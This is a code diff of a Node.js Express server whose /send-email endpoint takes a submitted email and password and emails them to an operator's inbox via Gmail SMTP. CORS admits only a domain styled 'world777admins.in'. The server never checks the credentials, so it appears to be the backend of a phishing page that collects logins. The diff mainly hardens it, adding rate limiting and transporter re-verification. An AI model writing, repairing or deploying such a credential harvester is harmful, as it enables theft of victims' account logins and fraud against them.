@@ -1,180 +1,154 @@
+// server.js
+require('dotenv').config();
 const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
-require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Enhanced CORS configuration
-const corsOptions = {
-  origin: ['https://world777admins.in','http://localhost:3000'], // Fixed the origin URL
+/* ---------- CORS ---------- */
+const allowedOrigins = [
+  'https://world777admins.in',
+  'http://localhost:3000',
+  ...(process.env.ALLOWED_ORIGIN ? process.env.ALLOWED_ORIGIN.split(',').map(s => s.trim()) : [])
+];
+
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin || allowedOrigins.includes(origin)) return callback(null, true);
+    callback(new Error('CORS blocked'));
+  },
   credentials: true,
+}));
+
+/* ---------- BODY PARSERS ---------- */
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+/* ---------- SIMPLE RATE LIMIT (30 emails/min) ---------- */
+const RATE_LIMIT = parseInt(process.env.RATE_LIMIT_PER_MIN || '30', 10);
+const sentLog = [];
+const isRateLimited = () => {
+  const now = Date.now();
+  while (sentLog.length && sentLog[0] < now - 60_000) sentLog.shift();
+  return sentLog.length >= RATE_LIMIT;
 };
 
-// Middleware
-app.use(cors(corsOptions));
-app.use(express.json({ limit: '10mb' })); // Increased limit and added error handling
-app.use(express.urlencoded({ extended: true, limit: '10mb' })); // Added URL encoded parser
+/* ---------- TRANSPORTER (App Password only) ---------- */
+let transporter = null;
 
-// Enhanced error handling for JSON parsing
-app.use((error, req, res, next) => {
-  if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
-    console.error('Bad JSON input:', error);
-    return res.status(400).json({
-      success: false,
-      message: 'Invalid JSON format in request body',
-      error: 'Bad Request - Malformed JSON'
-    });
+const createTransporter = () => {
+  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+    throw new Error('EMAIL_USER and EMAIL_PASS must be set in .env');
   }
-  next();
-});
 
-// Create transporter object using SMTP transport
-let transporter;
-const initializeTransporter = () => {
-  transporter = nodemailer.createTransport({
-    service: 'gmail',
+  return nodemailer.createTransport({
     host: 'smtp.gmail.com',
     port: 465,
-    secure: true,
-    tls: {
-      rejectUnauthorized: true,
-      ciphers: 'SSLv3',
-      minVersion: 'TLSv1.2',
-      maxVersion: 'TLSv1.3'
-    },
+    secure: true, // SSL
     auth: {
       user: process.env.EMAIL_USER,
-      pass: process.env.EMAIL_PASS
+      pass: process.env.EMAIL_PASS, // 16-char App Password
     },
-    // Add timeout configuration
-    connectionTimeout: 60000, // 60 seconds
-    greetingTimeout: 60000,   // 60 seconds
-    socketTimeout: 60000      // 60 seconds
+    connectionTimeout: 60_000,
+    greetingTimeout: 60_000,
+    socketTimeout: 60_000,
+    tls: {
+      rejectUnauthorized: true
+    }
   });
 };
 
-// Initialize transporter
-initializeTransporter();
+const getTransporter = async () => {
+  if (!transporter) transporter = createTransporter();
 
-// Reinitialize transporter when needed
-const getTransporter = () => {
-  if (!transporter) {
-    initializeTransporter();
+  try {
+    await Promise.race([
+      transporter.verify(),
+      new Promise((_, rej) => setTimeout(() => rej(new Error('verify timeout')), 30_000))
+    ]);
+  } catch (err) {
+    console.warn('Transporter verify failed → recreating:', err.message);
+    transporter.close?.();
+    transporter = createTransporter();
+    await transporter.verify(); // final check
   }
   return transporter;
 };
 
-// Email sending endpoint
-app.post('/send-email', async (req, res) => {
-  try {
-    const { email, password } = req.body;
+/* ---------- ROUTES ---------- */
 
-    // Validate required fields
-    if (!email || !password) {
-      return res.status(400).json({
-        success: false,
-        message: 'Email and password are required'
-      });
-    }
-
-    // Get transporter
-    const currentTransporter = getTransporter();
-    
-    // Check if environment variables are set
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
-      return res.status(500).json({
-        success: false,
-        message: 'Email service not properly configured. Please check environment variables.'
-      });
-    }
-
-    // Default to recipient from env or the same as sender
-    const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER;
-
-    // Verify transporter configuration with timeout
-    try {
-      await Promise.race([
-        currentTransporter.verify(),
-        new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Connection timeout during verification - please check network/firewall settings')), 60000)
-        )
-      ]);
-    } catch (verifyError) {
-      console.error('Transporter verification failed:', verifyError);
-      // Try to reinitialize transporter and verify again
-      initializeTransporter();
-      const newTransporter = getTransporter();
-      
-      // Skip verification in case of network issues, proceed directly to sending
-      console.log('Skipping verification due to timeout, attempting to send email directly');
-    }
-
-    // Send mail with timeout
-    const info = await Promise.race([
-      currentTransporter.sendMail({
-        from: process.env.EMAIL_USER,
-        to: recipient,
-        subject: 'Login Credentials',
-        text: 'Your login credentials are: \n Email: ' + email + '\n Password: ' + password
-      }),
-      new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Connection timeout during email sending - please check network/firewall settings')), 60000)
-      )
-    ]);
-
-    console.log('Email sent: ' + info.response);
-    res.status(200).json({
-      success: true,
-      message: 'Email sent successfully',
-      messageId: info.messageId
-    });
-  } catch (error) {
-    console.error('Error sending email:', error);
-    // More detailed error response
-    res.status(500).json({
-      success: false,
-      message: 'Failed to send email',
-      error: error.message,
-      // Add more details for debugging
-      details: {
-        code: error.code,
-        command: error.command,
-        stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
-      }
-    });
-  }
-});
-
-// Health check endpoint
+// Health check
 app.get('/', (req, res) => {
-  res.status(200).json({
+  res.json({
     success: true,
     message: 'Email API is running!',
     timestamp: new Date().toISOString()
   });
 });
 
-// Reinitialize transporter endpoint (useful for refreshing credentials)
-app.post('/reinit-transporter', (req, res) => {
+// Send email
+app.post('/send-email', async (req, res) => {
   try {
-    initializeTransporter();
-    res.status(200).json({
-      success: true,
-      message: 'Transporter reinitialized successfully'
-    });
-  } catch (error) {
+    const { email, password } = req.body;
+
+    if (!email || !password) {
+      return res.status(400).json({ success: false, message: 'email and password required' });
+    }
+
+    if (isRateLimited()) {
+      return res.status(429).json({ success: false, message: 'Too many requests – try again later' });
+    }
+
+    const mailer = await getTransporter();
+    const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER;
+
+    const info = await Promise.race([
+      mailer.sendMail({
+        from: `"World777" <${process.env.EMAIL_USER}>`,
+        to: recipient,
+        subject: 'Your Login Credentials',
+        text: `Email: ${email}\nPassword: ${password}`
+      }),
+      new Promise((_, rej) => setTimeout(() => rej(new Error('send timeout')), 60_000))
+    ]);
+
+    sentLog.push(Date.now());
+    console.log('Email sent →', info.messageId);
+
+    res.json({ success: true, message: 'Email sent', messageId: info.messageId });
+  } catch (err) {
+    console.error('Send failed:', err.message);
     res.status(500).json({
       success: false,
-      message: 'Failed to reinitialize transporter',
-      error: error.message
+      message: 'Failed to send email',
+      error: err.message
     });
   }
 });
 
-app.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
-  console.log(`Health check endpoint: http://localhost:${PORT}/`);
-  console.log(`Email sending endpoint: http://localhost:${PORT}/send-email`);
+// Reinitialize transporter (e.g. after changing .env)
+app.post('/reinit-transporter', (req, res) => {
+  try {
+    transporter?.close?.();
+    transporter = null;
+    res.json({ success: true, message: 'Transporter reset' });
+  } catch (e) {
+    res.status(500).json({ success: false, message: e.message });
+  }
 });
+
+/* ---------- START SERVER ---------- */
+(async () => {
+  try {
+    await getTransporter(); // warm-up
+    await app.listen(PORT);
+    console.log(`Server running on port ${PORT}`);
+    console.log(`Health: http://localhost:${PORT}/`);
+    console.log(`Send:   POST http://localhost:${PORT}/send-email`);
+  } catch (err) {
+    console.error('Startup error:', err);
+    process.exit(1);
+  }
+})();
